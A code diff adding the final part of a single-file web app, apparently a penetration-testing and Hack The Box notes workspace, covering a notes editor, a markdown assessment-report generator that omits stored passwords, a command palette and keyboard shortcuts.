+    b.innerHTML = '<span class="t">'+esc(n.title || "Untitled")+'</span><span class="d">'+esc(new Date(n.updated).toLocaleString())+'</span>';
+    b.addEventListener("click", function(){ openNote(n.id); });
+    wrap.appendChild(b);
+  });
+}
+function openNote(id){
+  var n = noteById(id);
+  if(!n) return;
+  activeNoteId = id;
+  previewMode = false;
+  $("#noteTitle").value = n.title;
+  $("#noteBody").value = n.body;
+  $("#notePreview").classList.add("hidden");
+  $("#noteBody").classList.remove("hidden");
+  $("#notePreviewBtn").textContent = "Preview";
+  $("#noteSaved").textContent = "Last saved " + new Date(n.updated).toLocaleString();
+  renderNoteList();
+}
+function newNote(){
+  var n = {id:"n"+Date.now(), title:"Untitled note", body:"", updated:Date.now()};
+  notes.push(n);
+  save("dex.notes.v1", notes);
+  openNote(n.id);
+  $("#noteTitle").focus();
+  $("#noteTitle").select();
+  logActivity("Note created: " + n.title);
+}
+var saveNoteDebounced = debounce(function(){
+  var n = noteById(activeNoteId);
+  if(!n) return;
+  n.title = $("#noteTitle").value.trim() || "Untitled";
+  n.body = $("#noteBody").value;
+  n.updated = Date.now();
+  save("dex.notes.v1", notes);
+  $("#noteSaved").textContent = "Saved " + new Date(n.updated).toLocaleTimeString();
+  renderNoteList();
+}, 500);
+$("#noteTitle").addEventListener("input", saveNoteDebounced);
+$("#noteBody").addEventListener("input", saveNoteDebounced);
+$("#nNew").addEventListener("click", newNote);
+$("#nSearch").addEventListener("input", renderNoteList);
+$("#notePreviewBtn").addEventListener("click", function(){
+  previewMode = !previewMode;
+  var body = $("#noteBody"), prev = $("#notePreview");
+  if(previewMode){
+    prev.innerHTML = md(body.value) || "<p class='muted'>Nothing to preview yet.</p>";
+    prev.classList.remove("hidden");
+    body.classList.add("hidden");
+    $("#notePreviewBtn").textContent = "Edit";
+  } else {
+    prev.classList.add("hidden");
+    body.classList.remove("hidden");
+    $("#notePreviewBtn").textContent = "Preview";
+  }
+});
+$("#noteDelete").addEventListener("click", function(){
+  var n = noteById(activeNoteId);
+  if(!n) return;
+  armDelete(this, function(){
+    if(activeNoteId !== n.id) return;
+    notes = notes.filter(function(x){ return x.id !== activeNoteId; });
+    save("dex.notes.v1", notes);
+    activeNoteId = null;
+    $("#noteTitle").value = ""; $("#noteBody").value = "";
+    $("#notePreview").classList.add("hidden");
+    $("#noteBody").classList.remove("hidden");
+    $("#noteSaved").textContent = "Note deleted.";
+    renderNoteList();
+    logActivity("Note deleted: " + n.title);
+    toast("Note deleted", "ok");
+  });
+});
+$("#noteExport").addEventListener("click", function(){
+  var blob = new Blob([JSON.stringify(notes, null, 2)], {type:"application/json"});
+  var a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = "dex-notes.json";
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(function(){ URL.revokeObjectURL(a.href); a.remove(); }, 500);
+  toast("Notes exported as JSON", "ok");
+});
+
+/* ================= REPORTING ENGINE ================= */
+var lastReportMd = "";
+var lastReportName = "dex-assessment-notes.md";
+function generateReport(){
+  var now = new Date();
+  var sevCount = {Critical:0, High:0, Medium:0, Low:0, Info:0};
+  findings.forEach(function(f){ if(sevCount[f.severity] !== undefined) sevCount[f.severity]++; });
+  var lootByKind = {credential:0, hash:0, file:0, flag:0};
+  loot.forEach(function(l){ if(lootByKind[l.kind] !== undefined) lootByKind[l.kind]++; });
+  var lines = [];
+  lines.push("# Assessment Notes");
+  lines.push("");
+  lines.push("_Generated " + now.toLocaleString() + " · DEX Cyber Operator Workspace_");
+  lines.push("");
+  lines.push("## Executive Summary");
+  lines.push("");
+  if(!hosts.length && !findings.length){
+    lines.push("No findings recorded yet. This report is a skeleton built from an empty workspace — add hosts, structured evidence notes, and loot to populate it.");
+  } else {
+    lines.push("- Hosts tracked: " + hosts.length);
+    lines.push("- Findings recorded: " + findings.length + " (Critical " + sevCount.Critical + ", High " + sevCount.High + ", Medium " + sevCount.Medium + ", Low " + sevCount.Low + ", Info " + sevCount.Info + ")");
+    lines.push("- Credentials stored: " + creds.length);
+    lines.push("- Loot items: " + loot.length + " (credentials " + lootByKind.credential + ", hashes " + lootByKind.hash + ", files " + lootByKind.file + ", flags " + lootByKind.flag + ")");
+    lines.push("- Machines in the HTB Vault: " + vault.length);
+    if(findings.length){
+      lines.push("");
+      lines.push("Top severities: " + Object.keys(sevCount).filter(function(k){ return sevCount[k] > 0; }).map(function(k){ return k + " " + sevCount[k]; }).join(", "));
+    }
+  }
+  lines.push("");
+  lines.push("## Scope");
+  lines.push("");
+  if(!hosts.length){
+    lines.push("No hosts tracked yet.");
+  } else {
+    lines.push("| Host | Name | Status | Services | Foothold | PrivEsc |");
+    lines.push("|---|---|---|---|---|---|");
+    hosts.forEach(function(h){
+      var svcs = (h.services || []).map(function(s){ return s.port + "/" + s.service; }).join(", ") || "—";
+      lines.push("| " + h.ip + " | " + (h.name || "—") + " | " + h.status + " | " + svcs + " | " + h.foothold + " | " + h.privesc + " |");
+    });
+  }
+  lines.push("");
+  lines.push("## Findings");
+  lines.push("");
+  if(!findings.length){
+    lines.push("No findings recorded yet.");
+  } else {
+    var sevOrder = {Critical:0, High:1, Medium:2, Low:3, Info:4};
+    findings.slice().sort(function(a,b){ return sevOrder[a.severity] - sevOrder[b.severity]; }).forEach(function(f, i){
+      var h = f.hostId ? hostById(f.hostId) : null;
+      lines.push("### " + (i+1) + ". " + f.title);
+      lines.push("");
+      lines.push("**Severity:** " + f.severity);
+      lines.push("");
+      lines.push("**Host:** " + (h ? hostLabel(h) : "Not linked to a host"));
+      lines.push("");
+      lines.push("**Finding:** " + (f.finding || "—"));
+      lines.push("");
+      lines.push("**Evidence:**");
+      lines.push("");
+      lines.push(f.evidence ? "```\n" + f.evidence + "\n```" : "—");
+      lines.push("");
+      lines.push("**Remediation:** " + (f.remediation || "—"));
+      lines.push("");
+    });
+  }
+  lines.push("## Credentials");
+  lines.push("");
+  if(!creds.length){
+    lines.push("No credentials stored.");
+  } else {
+    lines.push("Usernames and services only — passwords are stored in the Loot Locker and are not included in this export.");
+    lines.push("");
+    creds.forEach(function(c){
+      var h = c.hostId ? hostById(c.hostId) : null;
+      lines.push("- " + c.username + " @ " + (c.service || "unknown service") + (h ? " (" + h.ip + ")" : ""));
+    });
+  }
+  lines.push("");
+  lines.push("## Loot Summary");
+  lines.push("");
+  if(!loot.length){
+    lines.push("No loot captured yet.");
+  } else {
+    lines.push("- Credentials: " + lootByKind.credential);
+    lines.push("- Hashes: " + lootByKind.hash);
+    lines.push("- Files: " + lootByKind.file);
+    lines.push("- Flags: " + lootByKind.flag);
+    var flags = loot.filter(function(l){ return l.kind === "flag"; });
+    if(flags.length){
+      lines.push("");
+      lines.push("Flags captured: " + flags.map(function(f){ return f.flagType; }).join(", "));
+    }
+  }
+  lines.push("");
+  lines.push("---");
+  lines.push("");
+  lines.push("_Generated by DEX. Review every entry before sharing — this report contains only what was recorded in the workspace._");
+  lastReportMd = lines.join("\n");
+  renderReportPreview();
+  $("#reportMeta").textContent = "Generated " + now.toLocaleTimeString() + " · " + hosts.length + " host(s), " + findings.length + " finding(s), " + creds.length + " credential(s).";
+  $("#reportDownload").disabled = false;
+  $("#reportCopy").disabled = false;
+  logActivity("Assessment notes generated (" + findings.length + " finding(s), " + hosts.length + " host(s))");
+  toast("Assessment notes generated", "ok");
+}
+function renderReportPreview(){
+  var prev = $("#reportPreview");
+  prev.innerHTML = '<div class="report-pre md-preview">' + md(lastReportMd) + '</div>';
+}
+$("#reportGen").addEventListener("click", generateReport);
+$("#reportDownload").addEventListener("click", function(){
+  if(!lastReportMd) return;
+  var blob = new Blob([lastReportMd], {type:"text/markdown"});
+  var a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = lastReportName;
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(function(){ URL.revokeObjectURL(a.href); a.remove(); }, 500);
+  toast("Report downloaded", "ok");
+});
+$("#reportCopy").addEventListener("click", function(){
+  if(!lastReportMd) return;
+  copyText(lastReportMd);
+});
+
+/* ================= COMMAND PALETTE (Ctrl+P) ================= */
+var paletteItems = [];
+var paletteSel = 0;
+function paletteActions(){
+  return [
+    {kind:"Action", label:"Generate assessment notes", sub:"Report", run:function(){ showPage("report"); generateReport(); }},
+    {kind:"Action", label:"Add a host", sub:"Workspace", run:function(){ showPage("workspace"); $("#hIp").focus(); }},
+    {kind:"Action", label:"New note", sub:"Personal Notes", run:function(){ showPage("notes"); newNote(); }},
+    {kind:"Action", label:"Toggle dark / light theme", sub:"Appearance", run:function(){ toggleTheme(); }},
+    {kind:"Action", label:"Open AI Copilot", sub:"AI", run:function(){ openAiPanel(); }},
+    {kind:"Action", label:"Clear scan output", sub:"Scan Analysis", run:function(){ scanInput.value = ""; updateScanPreview(); showPage("scan"); }},
+    {kind:"Action", label:"Save detected services to current host", sub:"Scan Analysis", run:function(){ $("#addServicesBtn").click(); }}
+  ];
+}
+function buildPaletteItems(q){
+  q = (q || "").trim().toLowerCase();
+  var items = [];
+  PAGES.forEach(function(p){
+    if(!q || PAGE_LABELS[p].toLowerCase().indexOf(q) !== -1){
+      items.push({kind:"Section", label:PAGE_LABELS[p], sub:"Go to section", run:(function(page){ return function(){ showPage(page); }; })(p)});
+    }
+  });
+  COMMANDS.forEach(function(c){
+    if(q && (c.title+" "+c.cmd+" "+CATS[c.cat].label).toLowerCase().indexOf(q) === -1) return;
+    if(!q && items.length > 40) return;
+    items.push({kind:"Command", label:c.title, sub:c.cmd, run:(function(cmd){ return function(){ copyText(cmd); }; })(c.cmd)});
+  });
+  paletteActions().forEach(function(a){
+    if(!q || a.label.toLowerCase().indexOf(q) !== -1) items.push(a);
+  });
+  return items.slice(0, 60);
+}
+function renderPalette(){
+  var q = $("#paletteInput").value;
+  paletteItems = buildPaletteItems(q);
+  paletteSel = 0;
+  var list = $("#paletteList");
+  list.innerHTML = "";
+  if(!paletteItems.length){
+    var e = document.createElement("div");
+    e.className = "empty";
+    e.textContent = "Nothing found. Try a different search.";
+    list.appendChild(e);
+    return;
+  }
+  paletteItems.forEach(function(it, i){
+    var b = document.createElement("button");
+    b.type = "button";
+    b.className = "pal-item" + (i===paletteSel ? " sel" : "");
+    b.innerHTML = '<span class="k">'+esc(it.kind)+'</span><span>'+esc(it.label)+'</span><span class="s">'+esc(it.sub || "")+'</span>';
+    b.addEventListener("click", function(){ closePalette(); it.run(); });
+    b.addEventListener("mousemove", function(){ paletteSel = i; renderPaletteSel(); });
+    list.appendChild(b);
+  });
+}
+function renderPaletteSel(){
+  $$("#paletteList .pal-item").forEach(function(el, i){
+    el.classList.toggle("sel", i===paletteSel);
+  });
+}
+function openPalette(){
+  $("#palette").classList.add("open");
+  $("#paletteInput").value = "";
+  renderPalette();
+  $("#paletteInput").focus();
+}
+function closePalette(){
+  $("#palette").classList.remove("open");
+  $("#globalSearch").blur();
+}
+$("#paletteBtn").addEventListener("click", openPalette);
+$("#palette").addEventListener("click", function(e){ if(e.target === $("#palette")) closePalette(); });
+$("#paletteInput").addEventListener("input", renderPalette);
+$("#paletteInput").addEventListener("keydown", function(e){
+  if(e.key === "ArrowDown"){ e.preventDefault(); paletteSel = Math.min(paletteSel+1, paletteItems.length-1); renderPaletteSel(); }
+  else if(e.key === "ArrowUp"){ e.preventDefault(); paletteSel = Math.max(paletteSel-1, 0); renderPaletteSel(); }
+  else if(e.key === "Enter"){
+    e.preventDefault();
+    var it = paletteItems[paletteSel];
+    if(it){ closePalette(); it.run(); }
+  }
+  else if(e.key === "Escape"){ e.preventDefault(); closePalette(); }
+});
+
+/* ================= KEYBOARD SHORTCUTS ================= */
+document.addEventListener("keydown", function(e){
+  var tag = (e.target && e.target.tagName) || "";
+  var typing = tag === "INPUT" || tag === "TEXTAREA" || tag === "SELECT" || (e.target && e.target.isContentEditable);
+  if((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "k"){
+    e.preventDefault();
+    $("#globalSearch").focus();
+    $("#globalSearch").select();
+    return;
+  }
+  if((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "p"){
+    e.preventDefault();
+    if($("#palette").classList.contains("open")) closePalette(); else openPalette();
+    return;
+  }
+  if((e.ctrlKey || e.metaKey) && e.key === "Enter" && e.target === scanInput){
+    e.preventDefault();
+    $("#sendScanBtn").click();
+    return;
+  }
+  if(e.key === "Escape"){
+    if($("#palette").classList.contains("open")){ closePalette(); return; }
+    closeAiPanel();
+    return;
+  }
+  if(typing) return;
+  var keys = ["1","2","3","4","5","6","7","8","9","0"];
+  var idx = keys.indexOf(e.key);
+  if(idx !== -1 && idx < PAGES.length){ showPage(PAGES[idx]); return; }
+});
+
+/* ================= INIT ================= */
+applyTheme();
+if(aiKey) $("#aiKey").value = "";
+aiKeyStatus();
+renderObjectives();
+renderDashboard();
+renderWorm();
+renderCommands();
+renderWorkspace();
+renderChains();
+renderVault();
+renderEvidence();
+renderLoot();
+renderNoteList();
+updateScanPreview();
+updateScanContext();
+updateAiContext();
+if(notes.length && !activeNoteId){ openNote(notes.slice().sort(function(a,b){ return b.updated-a.updated; })[0].id); }
+</script>
+</body>
+</html>
